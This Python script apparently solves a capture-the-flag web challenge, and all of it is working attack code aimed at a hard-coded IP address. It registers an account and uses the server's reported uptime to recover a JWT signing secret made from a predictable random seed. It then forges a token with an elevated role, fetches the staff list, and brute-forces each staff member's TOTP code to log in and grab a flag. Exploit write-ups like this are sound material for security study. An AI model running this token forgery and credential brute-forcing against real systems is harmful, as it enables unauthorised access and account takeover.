import jwt, string, random, requests, logging, math, re, time
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

BASE_URL = "http://51.77.140.155:9100"
REGISTER_URL = f"{BASE_URL}/register"
print(REGISTER_URL)
LOGIN_URL = f"{BASE_URL}/login"
STATUS_URL = f"{BASE_URL}/status"
DASHBOARD_URL = f"{BASE_URL}/dashboard"
STAFF_URL = f"{BASE_URL}/fetchstaff"

USERNAME = random.choice(string.ascii_letters).lower() + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(7))
PASSWORD = USERNAME

strongpassword = ""

def register_user():
	response = requests.post(REGISTER_URL, data={"username": USERNAME, "password": PASSWORD})
	if response.status_code == 200:
		logging.info("User registered successfully.")
	else:
		logging.error("Failed to register user.")


def login_user(username=USERNAME, password=PASSWORD, TOTP=None):
	session = requests.Session()
	response = session.post(LOGIN_URL, data={"username": username, "password": password, "totp": TOTP})
	if response.status_code == 200:
		logging.info("User logged in successfully.")
		jwt_token = session.cookies.get("access_token_cookie")
		return jwt_token
	logging.error("Failed to log in user.")
	return None


def get_server_start_time():
	response = requests.get(STATUS_URL)
	if response.status_code == 200:
		uptime = response.json().get("uptime")
		start_time = time.time() - uptime
		logging.info(f"Server start time calculated: {start_time}")
		return start_time
	logging.error("Failed to get server start time.")
	return None

def bruteforce_jwt_secret(start_time):
	TIMEOUT = 5
	rounded_start_time = math.floor(start_time)
	possible_times = range(rounded_start_time - TIMEOUT, rounded_start_time + TIMEOUT + 1)
	for possible_up in possible_times:
		for pid in range(1, 65536):
			random.seed(possible_up + pid)
			global strongpassword
			strongpassword = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
			_ = "".join(random.choice(string.printable) for _ in range(32))
			candidate_secret = "".join(random.choice(string.printable) for _ in range(32))
			try:
				jwt.decode(jwt_token, candidate_secret, algorithms=["HS256"])
				logging.info(f"JWT secret found: {candidate_secret}")
				return candidate_secret
			except jwt.InvalidTokenError:
				continue
	logging.error("Failed to bruteforce JWT secret.")
	return None

def forge_jwt(jwt_secret):
	logging.info("Forging a new JWT with Teacher role.")
	payload = {
		"sub": USERNAME,
		"role": 1,
  		"totp": 0,
	}
	forged_token = jwt.encode(payload, jwt_secret, algorithm="HS256")
	logging.info("JWT forged successfully.")
	return forged_token

def fetch_staff():
	logging.info("Fetching the staff list.")
	response = requests.get(STAFF_URL, cookies={"access_token_cookie": forged_token})
	if response.status_code == 200:
		staff = response.json()
		logging.info(f"Fetched staff list: {staff}")
		return staff
	logging.error("Failed to fetch staff list.")
	return None

def get_flag(token):
	"""Get the flag by accessing the /dashboard endpoint."""
	logging.info("Getting the flag.")
	response = requests.get(DASHBOARD_URL, cookies={"access_token_cookie": token})
	if response.status_code == 200:
		flag = re.search(r"flag{.*}", response.text).group()
		logging.info(f"Flag: {flag}")
		return flag
	logging.error("Failed to get the flag.")
	return None

if __name__ == "__main__":
	register_user()
	jwt_token = login_user()

	if not jwt_token:
		logging.error("Exiting due to login failure.")
		exit(1)

	start_time = get_server_start_time()
	if not start_time:
		logging.error("Exiting due to failure in calculating server start time.")
		exit(1)

	jwt_secret = bruteforce_jwt_secret(start_time)
	if not jwt_secret:
		logging.error("Exiting due to failure in bruteforcing JWT secret.")
		exit(1)

	forged_token = forge_jwt(jwt_secret)
	
	
	logging.info("New JWT token")
	logging.info(forged_token)
	
	staff = fetch_staff()
	if not staff:
		logging.error("Exiting due to failure in fetching staff list.")
		exit(1)
  
	for s in staff:
		for i in range(1336, 10000):
			totp_code = str(i)
			rep = login_user(s["username"], strongpassword, totp_code)
			if rep:
				get_flag(rep)
				print(rep)
				break
